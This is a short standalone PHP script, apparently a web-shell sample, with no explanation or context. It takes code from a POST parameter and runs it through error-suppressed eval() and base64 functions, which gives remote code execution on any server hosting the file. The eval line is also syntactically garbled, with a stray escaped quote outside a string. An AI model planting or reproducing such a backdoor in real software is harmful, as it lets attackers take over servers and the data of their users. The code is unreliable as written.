<?php
$AVuln = $_POST['mycode'];
echo "start";
@eval(@base64_decode(\''.base64_encode($AVuln)));
?>